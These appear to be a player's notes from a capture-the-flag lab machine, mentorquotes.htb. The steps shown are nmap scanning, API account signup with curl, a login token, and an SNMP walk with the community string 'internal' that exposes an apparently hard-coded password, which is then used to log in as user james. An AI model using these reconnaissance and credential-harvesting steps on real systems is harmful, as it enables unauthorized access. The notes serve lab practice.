
# Nmap
```
Nmap scan report for 10.10.11.193
Host is up (0.058s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA)
|_  256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://mentorquotes.htb/
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.56 seconds

```

# Web
page is quote book


# fuzzing

**server-status** -> 403

# api
found api.mentorquotes.htb

has docs run by swagger
create user account
```
curl -X 'POST'   'http://api.mentorquotes.htb/auth/signup'   -H 'accept: application/json'   -H 'Content-Type: application/json'   -d '{
  "email": "simo@root.com",
  "username": "simo12343",
  "password": "password"
}'
```


`{"id":5,"email":"simo@root.com","username":"simo12343"}``

logging in give authorization string 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InNpbW8xMjM0MyIsImVtYWlsIjoic2ltb0Byb290LmNvbSJ9.VGHOqecfSmgtn7TPuv9gm1WnVJmwnJVBQ1gySpiGwzo' 

alos james is user with james@mentorquotes.htb

having a further scan with nmap finds snmp
using snmpbulkwalk 
`snmpbulkwalk -v2c -c internal 10.10.11.193 | grep login`
```
iso.3.6.1.2.1.25.4.2.1.2.917 = STRING: "systemd-logind"
iso.3.6.1.2.1.25.4.2.1.2.1700 = STRING: "login.sh"
iso.3.6.1.2.1.25.4.2.1.2.2106 = STRING: "login.py"
iso.3.6.1.2.1.25.4.2.1.4.917 = STRING: "/lib/systemd/systemd-logind"
iso.3.6.1.2.1.25.4.2.1.5.1700 = STRING: "/usr/local/bin/login.sh"
iso.3.6.1.2.1.25.4.2.1.5.2106 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
iso.3.6.1.2.1.25.6.3.1.2.478 = STRING: "login_1:4.8.1-2ubuntu2.1_amd64"

```

what seems to be hard coded creds

testing with login and as james works

